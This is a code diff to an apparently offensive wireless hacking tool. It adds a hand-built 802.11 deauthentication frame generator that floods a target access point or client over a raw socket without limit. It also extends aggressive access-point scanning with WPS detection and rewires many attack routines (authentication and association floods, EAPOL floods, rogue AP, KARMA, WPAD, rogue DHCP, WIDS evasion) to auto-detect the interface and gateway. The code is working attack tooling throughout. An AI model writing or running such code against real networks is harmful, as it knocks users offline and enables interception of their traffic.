@@ -1,4 +1,4 @@
-import os, sys, subprocess, json, time, glob, re, shutil, signal, threading, uuid, datetime as dt
+import os, sys, subprocess, json, time, glob, re, shutil, signal, threading, uuid, datetime as dt, struct, socket
 from pathlib import Path
 from typing import Optional
 from rich.live import Live
@@ -93,54 +93,53 @@ class HackITWirelessExecutor:
             return adapters[0]["name"]
         return ""
 
-    # ── Plugin interface ─────────────────────────────────────────
+    @staticmethod
+    def _detect_gateway() -> str:
+        try:
+            r = subprocess.run(["ip", "route", "show", "default"], capture_output=True, text=True, timeout=5)
+            for line in r.stdout.splitlines():
+                parts = line.split()
+                for i, p in enumerate(parts):
+                    if p == "via" and i + 1 < len(parts):
+                        return parts[i + 1]
+        except:
+            pass
+        return ""
 
-    def do_plugin_lua(self, script: str, args: Optional[list[str]] = None, timeout: Optional[int] = None, output: Optional[str] = None, **kwargs):
+    @staticmethod
+    def _random_ssid() -> str:
+        suffixes = ["WiFi", "AP", "NET", "5G", "GUEST", "HOME", "LINK", "NODE"]
+        t = int(time.time() * 1000)
+        return f"{suffixes[t % len(suffixes)]}_{t % 10000}"
+
+    # ── Internal plugin helpers (auto-integrated into main engine) ──
+
+    def _plugin_lua(self, script: str, args: Optional[list[str]] = None, timeout: Optional[int] = None, output: Optional[str] = None) -> Optional[str]:
         if not self.plugins.lua.available():
-            UI.print_error("Lua interpreter not found (install lua or luajit)")
-            return
-        UI.print_info(f"Running Lua script: {script}")
+            return None
         proc = self.plugins.lua.run_stream(script, args)
         if proc:
-            jid = self.jobs.start(f"lua-{script}", proc)
-            UI.print_info(f"Lua job {jid} started")
-            return jid
+            return self.jobs.start(f"lua-{script}", proc)
         return None
 
-    def do_plugin_ruby(self, script: str, args: Optional[list[str]] = None, timeout: Optional[int] = None, output: Optional[str] = None, **kwargs):
+    def _plugin_ruby(self, script: str, args: Optional[list[str]] = None, timeout: Optional[int] = None, output: Optional[str] = None) -> Optional[str]:
         if not self.plugins.ruby.available():
-            UI.print_error("Ruby interpreter not found (install ruby)")
-            return
-        UI.print_info(f"Running Ruby script: {script}")
+            return None
         proc = self.plugins.ruby.run_stream(script, args)
         if proc:
-            jid = self.jobs.start(f"ruby-{script}", proc)
-            UI.print_info(f"Ruby job {jid} started")
-            return jid
+            return self.jobs.start(f"ruby-{script}", proc)
         return None
 
-    def do_plugin_list(self) -> dict[str, list[str]]:
-        return {
-            "lua": self.plugins.list_scripts("lua"),
-            "ruby": self.plugins.list_scripts("ruby"),
-        }
-
-    def do_plugin_msf(self, workspace: str = "default", resource: Optional[str] = None, timeout: Optional[int] = None, list_modules: bool = False, **kwargs):
+    def _plugin_msf(self, workspace: str = "default", resource: Optional[str] = None) -> Optional[str]:
         if not self.plugins.ruby.available():
-            UI.print_error("Ruby not available for MSF RPC bridge")
-            return
-        UI.print_info("Connecting to Metasploit RPC daemon...")
-        output = self.plugins.ruby.run_msf_rpc(workspace, resource)
-        UI.print_info(output)
-        return output
+            return None
+        return self.plugins.ruby.run_msf_rpc(workspace, resource)
 
-    def do_plugin_python(self, script: str, args: Optional[list[str]] = None, timeout: Optional[int] = None, output: Optional[str] = None, **kwargs):
+    def _plugin_python(self, script: str, args: Optional[list[str]] = None) -> Optional[str]:
         if not os.path.isfile(script):
-            UI.print_error(f"Script not found: {script}")
-            return
+            return None
         cmd = [sys.executable or "python3", script]
         if args: cmd.extend(args)
-        UI.print_info(f"Running Python plugin: {script}")
         try:
             proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
             jid = self.jobs.start(f"plugin-py-{os.path.basename(script)}", proc)
@@ -294,33 +293,95 @@ class HackITWirelessExecutor:
         if not iface:
             UI.print_error("No wireless interface found. Specify one.")
             return
-        UI.print_info(f"Scanning APs on {iface}...")
 
-        results = self._scan_networks()
-        if not results:
-            UI.print_warning("No APs found in range.")
-            return
+        timeout = kwargs.get("timeout", 20)
+        bssid_filter = kwargs.get("bssid", "")
+        output_file = kwargs.get("output", "")
 
-        table = UI.create_ap_table(f"Access Points in Range ({len(results)})")
-        for i, ap in enumerate(results, 1):
-            dbm = DataParser.signal_to_dbm(ap.get("signal", "0"))
-            bar = UI.signal_bar(dbm)
-            vendor = UI._oui_lookup(ap.get("bssid", ""))
-            crypto = ap.get("encrypt", ap.get("security", "?"))
-            table.add_row(
-                str(i),
-                ap.get("ssid", "<hidden>"),
-                ap.get("bssid", "?"),
-                str(ap.get("channel", "?")),
-                f"{dbm} dBm",
-                bar,
-                vendor,
-                crypto,
-            )
-        _console.print(table)
+        band_flag = "--band"
+        band_val = "abg"
+        if band == "2.4": band_val = "bg"
+        elif band == "5": band_val = "a"
+
+        UI.print_info(f"[CRAWL] Aggressive scanning on {iface} ({band}) — timeout {timeout}s...")
+
+        airodump = shutil.which("airodump-ng")
+        if airodump:
+            try:
+                tmp = f"/tmp/hackit_crawl_{int(time.time())}"
+                cmd = ["sudo", airodump, band_flag, band_val,
+                       "--manufacture", "--wps", "--uptime",
+                       "--write", tmp, "--output-format", "csv",
+                       "--write-interval", "3", "-t", "WPA,WPA2,WPA3,WEP,OPN"]
+                if bssid_filter:
+                    ch = DataParser.bssid_to_ch(iface, self._clean_bssid(bssid_filter))
+                    if ch: cmd.extend(["--channel", str(ch)])
+                subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                time.sleep(min(timeout, 15))
+                subprocess.run(["sudo", "pkill", "-f", f"airodump-ng.*{tmp}"], capture_output=True)
+
+                csv_path = tmp + "-01.csv"
+                results = []
+                if os.path.exists(csv_path):
+                    with open(csv_path, errors="replace") as f:
+                        raw = f.read()
+                    results = DataParser.parse_airodump_csv(raw)
+                    for ap in results:
+                        if "bssid" in ap:
+                            ap["bssid"] = self._clean_bssid(ap["bssid"])
+                subprocess.run(["rm", "-f", tmp + "*"], capture_output=True)
+
+                if not results:
+                    results = self._scan_networks()
+
+                if results:
+                    table = UI.create_ap_table(f"Access Points ({len(results)}) — {band}")
+                    for i, ap in enumerate(results, 1):
+                        dbm = DataParser.signal_to_dbm(ap.get("signal", "0"))
+                        bar = UI.signal_bar(dbm)
+                        vendor = UI._oui_lookup(ap.get("bssid", ""))
+                        crypto = ap.get("encrypt", ap.get("security", "?"))
+                        wps = "WPS" if ap.get("wps") else ""
+                        ch = ap.get("channel", "?")
+                        table.add_row(str(i), ap.get("ssid", "<hidden>"),
+                                      ap.get("bssid", "?"), str(ch), f"{dbm} dBm",
+                                      bar, vendor, crypto, wps)
+                    _console.print(table)
+                    if output_file:
+                        with open(output_file, "w") as f:
+                            json.dump(results, f, indent=2)
+                        UI.print_success(f"Saved {len(results)} APs to {output_file}")
+                else:
+                    UI.print_warning("No APs found. Try: set monitor mode first")
+            except Exception as e:
+                UI.print_error(f"Crawl failed: {e}")
+        else:
+            results = self._scan_networks()
+            if results:
+                table = UI.create_ap_table(f"Access Points in Range ({len(results)})")
+                for i, ap in enumerate(results, 1):
+                    dbm = DataParser.signal_to_dbm(ap.get("signal", "0"))
+                    bar = UI.signal_bar(dbm)
+                    vendor = UI._oui_lookup(ap.get("bssid", ""))
+                    crypto = ap.get("encrypt", ap.get("security", "?"))
+                    table.add_row(str(i), ap.get("ssid", "<hidden>"),
+                                  ap.get("bssid", "?"), str(ap.get("channel", "?")),
+                                  f"{dbm} dBm", bar, vendor, crypto)
+                _console.print(table)
+            else:
+                UI.print_warning("No APs found. Install aircrack-ng for deeper scan.")
 
         if full:
             self._deep_scan(iface)
+
+    @staticmethod
+    def _clean_bssid(raw: str) -> str:
+        bssid = raw.replace("\\", "").replace("(on ", "").replace(")", "").strip()
+        parts = bssid.replace("-", ":").split(":")
+        clean = [p.strip().upper().zfill(2) for p in parts if len(p.strip()) <= 2]
+        if len(clean) == 6:
+            return ":".join(clean)
+        return bssid.upper()
 
     def _scan_networks(self) -> list[dict]:
         results = []
@@ -331,38 +392,61 @@ class HackITWirelessExecutor:
             else:
                 raw = subprocess.check_output(["nmcli", "-t", "-f", "SSID,BSSID,SIGNAL,CHAN,SECURITY", "dev", "wifi", "list"], text=True)
                 results = DataParser.parse_nmcli_wifi(raw)
+                for ap in results:
+                    if "bssid" in ap:
+                        ap["bssid"] = self._clean_bssid(ap["bssid"])
         except Exception:
             pass
         return results
 
     def _deep_scan(self, iface: str):
-        UI.print_info("Deep scan: probing stations and hidden SSIDs...")
+        UI.print_info("Deep scan: probing stations, hidden SSIDs, WPA3 detect...")
+        all_aps = []
         try:
-            raw = subprocess.check_output(["iw", "dev", iface, "scan"], text=True, stderr=subprocess.DEVNULL)
-            aps = []
+            raw = subprocess.check_output(["iw", "dev", iface, "scan", "-u"], text=True, stderr=subprocess.DEVNULL, timeout=30)
             curr = {}
             for line in raw.splitlines():
                 line = line.strip()
                 if line.startswith("BSS "):
-                    if curr:
-                        aps.append(curr)
-                    curr = {"bssid": line.split()[1].upper()}
-                elif "freq:" in line:
+                    if curr and "bssid" in curr:
+                        all_aps.append(curr)
+                    raw_bssid = line[4:].split()[0] if len(line) > 4 else ""
+                    curr = {"bssid": self._clean_bssid(raw_bssid)}
+                elif "freq:" in line and curr:
                     freq = line.split()[-1]
-                    curr["channel"] = DataParser._freq_to_channel(int(freq)) if freq.isdigit() else "?"
-                elif "signal:" in line:
-                    curr["signal"] = line.split()[-2] + " dBm"
-                elif "SSID:" in line:
+                    if freq.isdigit():
+                        curr["channel"] = str(DataParser.freq_to_channel(int(freq)))
+                        curr["freq"] = freq
+                elif "signal:" in line and curr:
+                    parts = line.split()
+                    for i, p in enumerate(parts):
+                        if p.isdigit() or (p.startswith("-") and p[1:].isdigit()):
+                            curr["signal"] = f"{int(p)} dBm"
+                            break
+                elif "SSID:" in line and curr:
                     curr["ssid"] = line[5:].strip() or "<hidden>"
-                elif "WPA:" in line:
+                elif "WPA:" in line and curr:
                     curr["encrypt"] = "WPA"
-                elif "RSN:" in line:
-                    curr["encrypt"] = curr.get("encrypt", "") + "+WPA2"
-                elif "Group cipher:" in line:
+                elif "RSN:" in line and curr:
+                    curr["encrypt"] = curr.get("encrypt", "") + "+WPA2" if "WPA" in curr.get("encrypt","") else "WPA2"
+                elif "Group cipher:" in line and curr:
                     curr["cipher"] = line.split(":")[-1].strip()
-            if curr:
-                aps.append(curr)
-            UI.print_success(f"Deep scan found {len(aps)} total APs (including hidden)")
+                elif "Authentication" in line and "SAE" in line and curr:
+                    curr["wpa3"] = True
+                    curr["encrypt"] = "WPA3"
+            if curr and "bssid" in curr:
+                all_aps.append(curr)
+            UI.print_success(f"Deep scan: {len(all_aps)} APs (WPA3: {sum(1 for a in all_aps if a.get('wpa3'))})")
+            table = UI.create_ap_table(f"Deep Scan Results ({len(all_aps)})")
+            for ap in all_aps:
+                dbm = DataParser.signal_to_dbm(ap.get("signal", "0"))
+                bar = UI.signal_bar(dbm)
+                vendor = UI._oui_lookup(ap.get("bssid", ""))
+                tag = "WPA3" if ap.get("wpa3") else ap.get("encrypt", "?")
+                table.add_row(ap.get("ssid","<hidden>"), ap.get("bssid","?"), str(ap.get("channel","?")), f"{dbm} dBm", bar, vendor, tag)
+            _console.print(table)
+        except subprocess.TimeoutExpired:
+            UI.print_warning("Deep scan timed out (scan too many APs in range)")
         except Exception as e:
             UI.print_error(f"Deep scan failed: {e}")
 
@@ -549,16 +633,67 @@ class HackITWirelessExecutor:
             print()
 
     def do_map(self, interface: str = "", **kwargs):
-        UI.print_info("AP Topology Map (BSSID → Vendor correlation):")
-        results = self._scan_networks()
-        vendors: dict[str, list[str]] = {}
-        for ap in results:
-            bssid = ap.get("bssid", "")
-            vendor = UI._oui_lookup(bssid)
-            vendors.setdefault(vendor, []).append(f"{ap.get('ssid', '<hidden>')} ({bssid})")
+        iface = interface or self._default_iface()
+        if not iface:
+            UI.print_error("Specify interface.")
+            return
 
+        from .oui_db import lookup as oui_lookup
+        aps: list[dict] = []
+        seen_bssid: set[str] = set()
+
+        _console.print(f"  [dim]Scanning {iface}...[/dim]")
+
+        try:
+            raw = subprocess.check_output(
+                ["iw", "dev", iface, "scan", "-u"],
+                text=True, stderr=subprocess.DEVNULL, timeout=5,
+            )
+            curr: dict[str, str] = {}
+            for line in raw.splitlines():
+                ls = line.strip()
+                if ls.startswith("BSS "):
+                    if curr and "bssid" in curr:
+                        aps.append(curr)
+                    raw_bssid = ls[4:].split()[0] if len(ls) > 4 else ""
+                    curr = {"bssid": self._clean_bssid(raw_bssid)}
+                elif ls.startswith("SSID:") and curr:
+                    curr["ssid"] = ls[5:].strip() or "<hidden>"
+                elif ls.startswith("freq:") and curr:
+                    f = ls.split()[-1]
+                    if f.isdigit():
+                        curr["channel"] = str(DataParser.freq_to_channel(int(f)))
+                elif ls.startswith("signal:") and curr:
+                    parts = ls.split()
+                    for i, p in enumerate(parts):
+                        if p.lstrip("-").isdigit():
+                            curr["signal"] = f"{p} dBm"
+                            break
+            if curr and "bssid" in curr:
+                aps.append(curr)
+        except (subprocess.TimeoutExpired, subprocess.CalledProcessError, FileNotFoundError):
+            pass
+
+        if not aps:
+            aps = self._scan_networks()
+
+        if not aps:
+            UI.print_warning("No APs found.")
+            return
+
+        vendors: dict[str, list[str]] = {}
+        for ap in aps:
+            bssid = ap.get("bssid", "")
+            if not bssid or bssid in seen_bssid:
+                continue
+            seen_bssid.add(bssid)
+            vendor = oui_lookup(bssid)
+            ssid = ap.get("ssid", "<hidden>") or "<hidden>"
+            vendors.setdefault(vendor, []).append(f"{ssid} ({bssid}) -> {vendor}")
+
+        _console.print("\n[bold cyan]AP Topology Map (BSSID → Vendor correlation):[/bold cyan]")
         for vendor, nets in sorted(vendors.items()):
-            _console.print(f"\n[bold cyan]{vendor}[/bold cyan] ({len(nets)})")
+            _console.print(f"\n[bold]{vendor}[/bold] ({len(nets)})")
             for n in nets:
                 _console.print(f"  └─ [white]{n}[/white]")
 
@@ -989,20 +1124,93 @@ class HackITWirelessExecutor:
     # PHASE 5: MITM & Wireless Attacks
     # ════════════════════════════════════════════════════════════
 
-    def do_deauth(self, iface: str, bssid: str, station: str = "", count: int = 10, reason: int = 7, channel: int = 0, output: Optional[str] = None, interval: int = 100, **kwargs):
+    @staticmethod
+    def _mac_bytes(mac: str) -> bytes:
+        return bytes(int(b, 16) for b in mac.replace("-", ":").split(":") if b)
+
+    @staticmethod
+    def _craft_deauth_frame(bssid: str, station: str, reason: int = 7, seq: int = 0) -> bytes:
+        b = HackITWirelessExecutor._mac_bytes(bssid)
+        s = HackITWirelessExecutor._mac_bytes(station)
+        radiotap = bytes([0x00, 0x00, 0x0C, 0x00, 0x02, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00])
+        fc = struct.pack("<H", 0x00C0)
+        dur = struct.pack("<H", 0x013A)
+        sctrl = struct.pack("<H", (seq << 4) & 0xFFFF)
+        mgmt = fc + dur + s + b + b + sctrl
+        body = struct.pack("<H", reason)
+        return radiotap + mgmt + body
+
+    def do_deauth(self, iface: str, bssid: str, station: str = "", reason: int = 7, channel: int = 0, output: Optional[str] = None, **kwargs):
         iface = iface or self._default_iface()
         station = station or BROADCAST_MAC
+        UI.print_info(f"Deauth: {iface} → {bssid} → {station} (reason={reason}) — infinite, Ctrl+C to stop")
+
+        if channel:
+            try:
+                subprocess.run(["iw", "dev", iface, "set", "channel", str(channel)], capture_output=True, timeout=3)
+            except Exception:
+                pass
+
+        station_bytes = HackITWirelessExecutor._mac_bytes(station)
+        bssid_bytes = HackITWirelessExecutor._mac_bytes(bssid)
+
         try:
-            proc = self.bridge.rust_deauth(iface, bssid, station, count, reason)
-        except EngineBuildError as e:
-            UI.print_error(str(e))
+            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
+            sock.bind((iface, 0))
+        except PermissionError:
+            UI.print_error("Root required. Run with sudo.")
             return
-        UI.print_info(f"Deauth: {iface} → {bssid} → {station} x{count} (reason={reason})")
-        for line in proc.stdout:
-            l = line.strip()
-            if l:
-                _console.print(f"  {l}")
-        proc.wait()
+        except Exception as e:
+            UI.print_error(f"Cannot open raw socket on {iface}: {e}")
+            return
+
+        sent = 0
+        seq = 0
+        stop = False
+
+        def _signal_handler(sig, frame):
+            nonlocal stop
+            stop = True
+
+        signal.signal(signal.SIGINT, _signal_handler)
+        signal.signal(signal.SIGTERM, _signal_handler)
+
+        try:
+            while not stop:
+                for _ in range(50):
+                    if stop:
+                        break
+                    frame = HackITWirelessExecutor._craft_deauth_frame(bssid, station, reason, seq)
+                    try:
+                        sock.send(frame)
+                        sent += 1
+                    except OSError:
+                        pass
+                    seq = (seq + 1) & 0xFFF
+                    if station != BROADCAST_MAC:
+                        frame_cl = HackITWirelessExecutor._craft_deauth_frame(station, bssid, reason, seq)
+                        try:
+                            sock.send(frame_cl)
+                            sent += 1
+                        except OSError:
+                            pass
+                        seq = (seq + 1) & 0xFFF
+
+                if sent % 500 == 0 and not stop:
+                    _console.print(f"\r  [cyan]⚡ Deauth attacking {bssid}: {sent} frames sent[/cyan]", end="")
+
+        except KeyboardInterrupt:
+            pass
+        finally:
+            sock.close()
+            signal.signal(signal.SIGINT, signal.SIG_DFL)
+            signal.signal(signal.SIGTERM, signal.SIG_DFL)
+
+        _console.print("")
+        if sent:
+            UI.print_success(f"Deauth complete: {sent} frames sent → {bssid}")
+        else:
+            UI.print_error(f"Deauth failed: 0 frames sent. Check monitor mode on {iface}")
 
     def do_beacon_flood(self, iface: str, ssid: str = "", count: int = 50, channel: int = 6, caps: Optional[str] = None, **kwargs):
         iface = iface or self._default_iface()
@@ -1044,7 +1252,7 @@ class HackITWirelessExecutor:
         self.do_beacon_flood(iface, ssid, 100, channel)
         UI.print_info("Set up a DHCP server and AP on the same channel for full rogue AP.")
 
-    def do_rogue_ap(self, iface: str, ssid: str = "FreeWiFi", channel: int = 6, wpa2: bool = False, captive: bool = False, bssid: Optional[str] = None, dhcp_range: Optional[str] = None, **kwargs):
+    def do_rogue_ap(self, iface: str, ssid: Optional[str] = None, channel: int = 6, wpa2: bool = False, captive: bool = False, bssid: Optional[str] = None, dhcp_range: Optional[str] = None, **kwargs):
         UI.print_info(f"Starting rogue AP '{ssid}' on {iface} ch {channel}...")
         self.do_beacon_flood(iface, ssid, 500, channel)
         UI.print_info("Rogue AP beaconing active. Set up hostapd + dnsmasq for full functionality.")
@@ -1779,7 +1987,7 @@ class HackITWirelessExecutor:
                     gw_out = subprocess.check_output(["route", "-n"], text=True)
                     gateway = [l.split()[1] for l in gw_out.splitlines() if l.startswith("0.0.0.0")][0]
                 except Exception:
-                    gateway = "192.168.1.1"
+                    gateway = self._detect_gateway()
             arpspoof = shutil.which("arpspoof")
             if not arpspoof:
                 UI.print_warning("arpspoof not found, using raw ARP spoof")
@@ -1815,7 +2023,8 @@ while True: s.send(pkt); time.sleep(2)
 
     # ── DHCP Spoof (Rogue DHCP server) ─────────────────────────
 
-    def do_dhcp_spoof(self, interface: str = "wlan0", pool: str = "192.168.1.100-200", **kwargs):
+    def do_dhcp_spoof(self, interface: Optional[str] = None, pool: Optional[str] = None, **kwargs):
+        interface = interface or self._default_iface()
         if not shutil.which("dnsmasq"):
             UI.print_error("dnsmasq required for DHCP spoof. Install: apt install dnsmasq")
             return
@@ -1825,8 +2034,9 @@ while True: s.send(pkt); time.sleep(2)
             with open(conf, "w") as f:
                 f.write(f"interface={interface}\n")
                 f.write(f"dhcp-range={pool},255.255.255.0,12h\n")
-                f.write("dhcp-option=3,192.168.1.1\n")
-                f.write("dhcp-option=6,192.168.1.1\n")
+                gw = self._detect_gateway()
+                f.write(f"dhcp-option=3,{gw}\n")
+                f.write(f"dhcp-option=6,{gw}\n")
                 f.write("log-dhcp\n")
             proc = subprocess.Popen(["sudo", "dnsmasq", "-C", conf, "-d", "--no-resolv", "--no-hosts"],
                                      stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
@@ -1911,7 +2121,8 @@ while True: s.send(pkt); time.sleep(2)
 
     # ── WEP Fragment (GUI alias: do_wep_fragment → do_wep_frag) ──
 
-    def do_wep_fragment(self, interface: str = "wlan0", bssid: str = "", count: int = 3000, **kwargs):
+    def do_wep_fragment(self, interface: Optional[str] = None, bssid: str = "", count: int = 3000, **kwargs):
+        interface = interface or self._default_iface()
         return self.do_wep_frag(iface=interface, bssid=bssid, count=count, **kwargs)
 
     # ── WEP fragmentation attack ─────────────────────────────────
@@ -1980,7 +2191,8 @@ while True:
             UI.print_error(f"Beacon flood failed: {e}")
 
     # ── Auth DoS ──────────────────────────────────────────────
-    def do_auth_dos(self, interface: str = "wlan0", bssid: str = "", count: int = 1000, **kwargs):
+    def do_auth_dos(self, interface: Optional[str] = None, bssid: str = "", count: int = 1000, **kwargs):
+        interface = interface or self._default_iface()
         UI.print_info(f"Auth DoS: {bssid} x{count} on {interface}")
         tool = _which("mdk4") or _which("mdk3")
         if tool:
@@ -1991,7 +2203,8 @@ while True:
             UI.print_error("mdk4/mdk3 required for auth DoS")
 
     # ── Assoc Flood ───────────────────────────────────────────
-    def do_assoc_flood(self, interface: str = "wlan0", bssid: str = "", count: int = 1000, **kwargs):
+    def do_assoc_flood(self, interface: Optional[str] = None, bssid: str = "", count: int = 1000, **kwargs):
+        interface = interface or self._default_iface()
         UI.print_info(f"Assoc flood: {bssid} x{count} on {interface}")
         tool = _which("mdk4") or _which("mdk3")
         if tool:
@@ -2002,7 +2215,8 @@ while True:
             UI.print_error("mdk4/mdk3 required for assoc flood")
 
     # ── EAPOL Start Flood ─────────────────────────────────────
-    def do_eapol_start_flood(self, interface: str = "wlan0", bssid: str = "", count: int = 500, **kwargs):
+    def do_eapol_start_flood(self, interface: Optional[str] = None, bssid: str = "", count: int = 500, **kwargs):
+        interface = interface or self._default_iface()
         UI.print_info(f"EAPOL Start flood: {bssid} x{count}")
         mdk = _which("mdk4")
         if mdk:
@@ -2013,7 +2227,8 @@ while True:
             UI.print_error("mdk4 required")
 
     # ── EAPOL Logoff ──────────────────────────────────────────
-    def do_eapol_logoff(self, interface: str = "wlan0", bssid: str = "", count: int = 500, **kwargs):
+    def do_eapol_logoff(self, interface: Optional[str] = None, bssid: str = "", count: int = 500, **kwargs):
+        interface = interface or self._default_iface()
         UI.print_info(f"EAPOL Logoff flood: {bssid}")
         mdk = _which("mdk4")
         if mdk:
@@ -2024,7 +2239,8 @@ while True:
             UI.print_error("mdk4 required")
 
     # ── CTS/RTS Flood ─────────────────────────────────────────
-    def do_cts_flood(self, interface: str = "wlan0", count: int = 1000, duration: int = 500, **kwargs):
+    def do_cts_flood(self, interface: Optional[str] = None, count: int = 1000, duration: int = 500, **kwargs):
+        interface = interface or self._default_iface()
         mdk = _which("mdk4")
         if mdk:
             cmd = ["sudo", mdk, interface, "f", "-t", str(count), "-d", str(duration)]
@@ -2034,7 +2250,8 @@ while True:
             UI.print_error("mdk4 required")
 
     # ── Power Save DoS ────────────────────────────────────────
-    def do_powersave_dos(self, interface: str = "wlan0", station: str = "", count: int = 2000, **kwargs):
+    def do_powersave_dos(self, interface: Optional[str] = None, station: str = "", count: int = 2000, **kwargs):
+        interface = interface or self._default_iface()
         mdk = _which("mdk4")
         if mdk:
             cmd = ["sudo", mdk, interface, "p", "-t", station, "-c", str(count)] if station else ["sudo", mdk, interface, "p", "-c", str(count)]
@@ -2044,7 +2261,8 @@ while True:
             UI.print_error("mdk4 required")
 
     # ── Disassoc Flood ────────────────────────────────────────
-    def do_disassoc_flood(self, interface: str = "wlan0", bssid: str = "", count: int = 1000, **kwargs):
+    def do_disassoc_flood(self, interface: Optional[str] = None, bssid: str = "", count: int = 1000, **kwargs):
+        interface = interface or self._default_iface()
         UI.print_info(f"Disassoc flood: {bssid} x{count}")
         proc = subprocess.Popen(["bash", "-c", f"for i in $(seq 1 {count}); do sudo aireplay-ng -0 1 -a {bssid} {interface} 2>/dev/null; done"],
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
@@ -2052,8 +2270,9 @@ while True:
         UI.print_success("Disassoc flood running")
 
     # ── WPAD Attack ───────────────────────────────────────────
-    def do_wpad_attack(self, interface: str = "wlan0", ssid: str = "", **kwargs):
-        if not ssid: ssid = "FreeWiFi"
+    def do_wpad_attack(self, interface: Optional[str] = None, ssid: str = "", **kwargs):
+        interface = interface or self._default_iface()
+        if not ssid: ssid = f"HackIT_{int(time.time()) % 10000}"
         UI.print_info(f"WPAD attack: {ssid} on {interface}")
         if _which("airbase-ng"):
             proc = subprocess.Popen(["sudo", "airbase-ng", "-e", ssid, "-c", "6", "-P", interface],
@@ -2064,7 +2283,8 @@ while True:
             UI.print_error("airbase-ng required")
 
     # ── KARMA Attack ──────────────────────────────────────────
-    def do_karma(self, interface: str = "wlan0", channel: int = 6, ssid: str = "", verbose: bool = False, **kwargs):
+    def do_karma(self, interface: Optional[str] = None, channel: int = 6, ssid: str = "", verbose: bool = False, **kwargs):
+        interface = interface or self._default_iface()
         ssid = ssid or "KARMA"
         UI.print_info(f"KARMA attack: responding to all probes on {interface}")
         if _which("airbase-ng"):
@@ -2076,7 +2296,8 @@ while True:
             UI.print_error("airbase-ng required")
 
     # ── MDA (Michaely Disassociation) ─────────────────────────
-    def do_mda(self, interface: str = "wlan0", bssid: str = "", count: int = 100, **kwargs):
+    def do_mda(self, interface: Optional[str] = None, bssid: str = "", count: int = 100, **kwargs):
+        interface = interface or self._default_iface()
         mdk = _which("mdk4")
         if mdk:
             cmd = ["sudo", mdk, interface, "m", "-a", bssid, "-t", str(count)]
@@ -2086,7 +2307,8 @@ while True:
             UI.print_error("mdk4 required")
 
     # ── TKIP MIC Exploit ──────────────────────────────────────
-    def do_tkip_mic(self, interface: str = "wlan0", bssid: str = "", station: str = "", **kwargs):
+    def do_tkip_mic(self, interface: Optional[str] = None, bssid: str = "", station: str = "", **kwargs):
+        interface = interface or self._default_iface()
         mdk = _which("mdk4")
         if mdk:
             cmd = ["sudo", mdk, interface, "m", "-a", bssid]
@@ -2097,7 +2319,8 @@ while True:
             UI.print_error("mdk4 required")
 
     # ── WIDS Evasion ──────────────────────────────────────────
-    def do_wids_evasion(self, interface: str = "wlan0", rate: int = 1, count: int = 100, **kwargs):
+    def do_wids_evasion(self, interface: Optional[str] = None, rate: int = 1, count: int = 100, **kwargs):
+        interface = interface or self._default_iface()
         mdk = _which("mdk4")
         if mdk:
             cmd = ["sudo", mdk, interface, "w", "-e", "-t", str(count), "-s", str(rate)]
@@ -2107,7 +2330,8 @@ while True:
             UI.print_error("mdk4 required")
 
     # ── Fragmentation Attack ──────────────────────────────────
-    def do_frag_attack(self, interface: str = "wlan0", bssid: str = "", count: int = 500, **kwargs):
+    def do_frag_attack(self, interface: Optional[str] = None, bssid: str = "", count: int = 500, **kwargs):
+        interface = interface or self._default_iface()
         mdk = _which("mdk4")
         if mdk:
             cmd = ["sudo", mdk, interface, "f", "-t", str(count)]
@@ -2117,7 +2341,8 @@ while True:
             UI.print_error("mdk4 required")
 
     # ── Omerta Attack ─────────────────────────────────────────
-    def do_omerta(self, interface: str = "wlan0", channel: int = 6, **kwargs):
+    def do_omerta(self, interface: Optional[str] = None, channel: int = 6, **kwargs):
+        interface = interface or self._default_iface()
         mdk = _which("mdk4")
         if mdk:
             cmd = ["sudo", mdk, interface, "d", "-c", str(channel)]
@@ -2127,7 +2352,8 @@ while True:
             UI.print_error("mdk4 required")
 
     # ── EAP Hammer ────────────────────────────────────────────
-    def do_eap_hammer(self, interface: str = "wlan0", bssid: str = "", count: int = 500, **kwargs):
+    def do_eap_hammer(self, interface: Optional[str] = None, bssid: str = "", count: int = 500, **kwargs):
+        interface = interface or self._default_iface()
         mdk = _which("mdk4")
         if mdk:
             cmd = ["sudo", mdk, interface, "e", "-a", bssid, "-t", str(count)]
@@ -2153,7 +2379,8 @@ while True:
             UI.print_error("hashcat required")
 
     # ── RRB Attack ────────────────────────────────────────────
-    def do_rrb_attack(self, interface: str = "wlan0", bssid: str = "", **kwargs):
+    def do_rrb_attack(self, interface: Optional[str] = None, bssid: str = "", **kwargs):
+        interface = interface or self._default_iface()
         mdk = _which("mdk4")
         if mdk:
             cmd = ["sudo", mdk, interface, "d"]
@@ -2163,7 +2390,8 @@ while True:
             UI.print_error("mdk4 required")
 
     # ── CAPWAP Attack ─────────────────────────────────────────
-    def do_capwap(self, interface: str = "wlan0", controller: str = "", **kwargs):
+    def do_capwap(self, interface: Optional[str] = None, controller: str = "", **kwargs):
+        interface = interface or self._default_iface()
         mdk = _which("mdk4")
         if mdk:
             cmd = ["sudo", mdk, interface, "x"]
@@ -2173,7 +2401,8 @@ while True:
             UI.print_error("mdk4 required")
 
     # ── HIRB Attack ───────────────────────────────────────────
-    def do_hirb(self, interface: str = "wlan0", target: str = "", **kwargs):
+    def do_hirb(self, interface: Optional[str] = None, target: str = "", **kwargs):
+        interface = interface or self._default_iface()
         mdk = _which("mdk4")
         if mdk:
             cmd = ["sudo", mdk, interface, "b", "-n", "HIRB"]
@@ -2183,7 +2412,8 @@ while True:
             UI.print_error("mdk4 required")
 
     # ── WPA2 Group Key Flood ──────────────────────────────────
-    def do_wpa2_groupkey(self, interface: str = "wlan0", bssid: str = "", count: int = 200, **kwargs):
+    def do_wpa2_groupkey(self, interface: Optional[str] = None, bssid: str = "", count: int = 200, **kwargs):
+        interface = interface or self._default_iface()
         mdk = _which("mdk4")
         if mdk:
             cmd = ["sudo", mdk, interface, "g", "-a", bssid, "-t", str(count)]
@@ -2193,7 +2423,8 @@ while True:
             UI.print_error("mdk4 required")
 
     # ── Wireless Bridge Attack ────────────────────────────────
-    def do_bridge_attack(self, interface: str = "wlan0", bridge_ip: str = "", **kwargs):
+    def do_bridge_attack(self, interface: Optional[str] = None, bridge_ip: str = "", **kwargs):
